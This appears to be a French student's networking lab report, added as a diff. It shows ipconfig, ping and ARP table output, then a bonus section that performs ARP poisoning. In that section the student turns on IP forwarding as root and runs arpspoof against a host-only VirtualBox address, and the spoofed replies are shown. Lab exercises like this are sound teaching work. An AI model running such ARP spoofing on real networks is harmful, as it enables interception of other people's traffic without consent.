@@ -1,0 +1,130 @@
+1. Basics
+
+☀️ Déterminer
+
+son adresse IP au sein du réseau local formé par le partage de co
+
+PS C:\Windows\system32> ipconfig /all
+Carte réseau sans fil Wi-Fi :
+
+   Suffixe DNS propre à la connexion. . . :
+   Description. . . . . . . . . . . . . . : Intel(R) Wi-Fi 6 AX101
+   Adresse physique . . . . . . . . . . . : 74-13-EA-8E-BB-06
+   DHCP activé. . . . . . . . . . . . . . : Non
+   Configuration automatique activée. . . : Oui
+   Adresse IPv6 de liaison locale. . . . .: fe80::5c69:71c5:51dc:c092%16(préféré)
+   Adresse IPv4. . . . . . . . . . . . . .: 11.11.11.11(préféré)
+   Masque de sous-réseau. . . . . . . . . : 255.0.0.0
+   Adresse IPv4. . . . . . . . . . . . . .: 192.168.87.56(préféré)
+   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
+   Passerelle par défaut. . . . . . . . . : 192.168.87.203
+   IAID DHCPv6 . . . . . . . . . . . : 125047786
+   DUID de client DHCPv6. . . . . . . . : 00-01-00-01-2C-E8-E5-6C-40-C2-BA-DB-A6-08
+   Serveurs DNS. . .  . . . . . . . . . . : 192.168.87.203
+   NetBIOS sur Tcpip. . . . . . . . . . . : Activé
+
+PS C:\Windows\system32> ipconfig /all
+ Adresse IPv4. . . . . . . . . . . . . .: 192.168.87.56(préféré)
+
+son adresse MAC
+
+PS C:\Windows\system32> ipconfig /all
+ Adresse physique . . . . . . . . . . . : 74-13-EA-8E-BB-06
+
+
+☀️ DIY
+
+prouvez que vous avez bien changé d'IP
+
+PS C:\Windows\system32> ipconfig /all
+
+Carte réseau sans fil Wi-Fi :
+
+   Suffixe DNS propre à la connexion. . . :
+   Description. . . . . . . . . . . . . . : Intel(R) Wi-Fi 6 AX101
+   Adresse physique . . . . . . . . . . . : 74-13-EA-8E-BB-06
+   DHCP activé. . . . . . . . . . . . . . : Non
+   Configuration automatique activée. . . : Oui
+   Adresse IPv6 de liaison locale. . . . .: fe80::5c69:71c5:51dc:c092%16(préféré)
+   Adresse IPv4. . . . . . . . . . . . . .: 11.11.11.11(préféré)
+   Masque de sous-réseau. . . . . . . . . : 255.0.0.0
+   Adresse IPv4. . . . . . . . . . . . . .: 192.168.87.97(préféré)
+   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
+   Passerelle par défaut. . . . . . . . . : 192.168.87.203
+   IAID DHCPv6 . . . . . . . . . . . : 125047786
+   DUID de client DHCPv6. . . . . . . . : 00-01-00-01-2C-E8-E5-6C-40-C2-BA-DB-A6-08
+   Serveurs DNS. . .  . . . . . . . . . . : 192.168.87.203
+   NetBIOS sur Tcpip. . . . . . . . . . . : Activé
+
+☀️ Pingz !
+
+PS C:\Windows\system32> ping 192.168.87.34
+
+Envoi d’une requête 'Ping'  192.168.87.34 avec 32 octets de données :
+Réponse de 192.168.87.34 : octets=32 temps=22 ms TTL=128
+Réponse de 192.168.87.34 : octets=32 temps=7 ms TTL=128
+Réponse de 192.168.87.34 : octets=32 temps=11 ms TTL=128
+Réponse de 192.168.87.34 : octets=32 temps=8 ms TTL=128
+
+ PS C:\Windows\system32> ping 192.168.87.15
+
+Envoi d’une requête 'Ping'  192.168.87.15 avec 32 octets de données :
+Réponse de 192.168.87.15 : octets=32 temps=7 ms TTL=128
+Réponse de 192.168.87.15 : octets=32 temps=10 ms TTL=128
+Réponse de 192.168.87.15 : octets=32 temps=12 ms TTL=128
+Réponse de 192.168.87.15 : octets=32 temps=27 ms TTL=128
+
+2. ARP
+
+☀️ Affichez votre table ARP !
+
+PS C:\Windows\system32> arp -a
+
+Interface : 11.11.11.11 --- 0x10
+  Adresse Internet      Adresse physique      Type
+  11.255.255.255        ff-ff-ff-ff-ff-ff     statique
+  192.168.87.15         98-5f-41-1d-62-58     dynamique
+  192.168.87.34         c8-8a-9a-e6-33-1d     dynamique
+  192.168.87.203        82-ea-80-64-7f-ae     dynamique
+  224.0.0.22            01-00-5e-00-00-16     statique
+  224.0.0.251           01-00-5e-00-00-fb     statique
+  224.0.0.252           01-00-5e-00-00-fc     statique
+  239.255.255.250       01-00-5e-7f-ff-fa     statique
+
+3 Bonus : ARP Poisoning
+
+☀️ Empoisonner la table ARP de l'un des membres de votre réseau
+
+PS C:\Users\titda> ipconfig /all
+
+Carte Ethernet Ethernet 2 :
+
+   Suffixe DNS propre à la connexion. . . :
+   Description. . . . . . . . . . . . . . : VirtualBox Host-Only Ethernet Adapter
+   Adresse physique . . . . . . . . . . . : 0A-00-27-00-00-07
+   DHCP activé. . . . . . . . . . . . . . : Non
+   Configuration automatique activée. . . : Oui
+   Adresse IPv6 de liaison locale. . . . .: fe80::67f9:6eda:19ac:613%7(préféré)
+   Adresse IPv4. . . . . . . . . . . . . .: 192.168.56.1(préféré)
+   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
+   Passerelle par défaut. . . . . . . . . :
+   IAID DHCPv6 . . . . . . . . . . . : 688521255
+   DUID de client DHCPv6. . . . . . . . : 00-01-00-01-2E-49-D1-4C-D8-43-AE-D4-F5-E6
+   NetBIOS sur Tcpip. . . . . . . . . . . : Activé
+
+askun@askun-ubuntu:~$ sudo su -
+[sudo] password for askun: 
+root@askun-ubuntu:~# echo 1 >/proc/sys/net/ipv4/ip_forward
+
+root@askun-ubuntu:~# arpspoof -i enp0s8 192.168.56.1
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
+8:0:27:20:5a:9f ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:20:5a:9f
